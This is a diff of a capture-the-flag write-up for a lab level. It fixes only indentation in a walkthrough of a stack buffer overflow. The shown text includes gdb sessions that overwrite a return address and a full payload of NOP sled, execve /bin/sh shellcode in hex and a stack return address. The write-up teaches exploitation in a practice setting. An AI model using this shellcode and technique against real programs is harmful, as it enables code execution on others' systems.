@@ -185,27 +185,27 @@ Fortunately, there is another parameter in this challenge that will solve that: 
     0xbffffb80:     0x42424242      0x42424242      0x42424242      0x42424242
     0xbffffb90:     0x42424242      0x42424242      0x00000000      0x080482da
 
-    And indeed, we wrote over the return address:
+And indeed, we wrote over the return address:
 
     (gdb) c
     Continuing.
 
     Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
+    0x42424242 in ?? ()
 
-    We have our overflow, now let's get a payload somewhere in memory.
+We have our overflow, now let's get a payload somewhere in memory.
 
-    We're going to use the shellcode found here: http://shell-storm.org/shellcode/files/shellcode-827.php
-    It's so small that it can fit in the `name` field of the user. And because we know where the field is in memory, we can reference it quite easily. Let's do that:
+We're going to use the shellcode found here: http://shell-storm.org/shellcode/files/shellcode-827.php
+It's so small that it can fit in the `name` field of the user. And because we know where the field is in memory, we can reference it quite easily. Let's do that:
 
-    First, let's find a suitable address to jump to and let's find the correct length we need to link the payload successfully. With the french greeting message, we can roll with:
+First, let's find a suitable address to jump to and let's find the correct length we need to link the payload successfully. With the french greeting message, we can roll with:
 
     (gdb) r $(python -c "print '\x90'*17 + 'A'*23 + ' ' + 'B'*26 + 'CDEF'")
     Starting program: /levels/level06 $(python -c "print '\x90'*17 + 'A'*23 + ' ' + 'B'*26 + 'CDEF'")
     /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
     Bienvenue AAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBCDEF
 
-Breakpoint 2, 0x08048591 in greetuser ()
+    Breakpoint 2, 0x08048591 in greetuser ()
     (gdb) x/44 $esp
     0xbffffaf0:     0xbffffb00      0xbffffb50      0xbffffb14      0x0804993c
     0xbffffb00:     0x6e656942      0x756e6576      0x90902065      0x90909090
@@ -219,7 +219,7 @@ Breakpoint 2, 0x08048591 in greetuser ()
     0xbffffb80:     0x42424242      0x42424242      0x42424242      0x42424242
     0xbffffb90:     0x44434242      0x00004645      0x00000000      0x080482da
 
-    We can see that the return address has been overridden with `0x46454443`, the 'CDEF' we added at the end of the payload. Then the NOP sled makes it easy to select an address, and we still have 23 bytes available for our payload. Let's select the address `0xbffffb10`:
+We can see that the return address has been overridden with `0x46454443`, the 'CDEF' we added at the end of the payload. Then the NOP sled makes it easy to select an address, and we still have 23 bytes available for our payload. Let's select the address `0xbffffb10`:
 
 
     (gdb) r $(python -c "print '\x90'*17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' ' + 'B'*26 + '\x10\xfb\xff\xbf'")
@@ -227,7 +227,7 @@ Breakpoint 2, 0x08048591 in greetuser ()
     /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
     Bienvenue 1Ph//shh/binS̀BBBBBBBBBBBBBBBBBBBBBBBBBB
 
-Breakpoint 2, 0x08048591 in greetuser ()
+    Breakpoint 2, 0x08048591 in greetuser ()
     (gdb) x/44 $esp
     0xbffffaf0:     0xbffffb00      0xbffffb50      0xbffffb14      0x0804993c
     0xbffffb00:     0x6e656942      0x756e6576      0x90902065      0x90909090
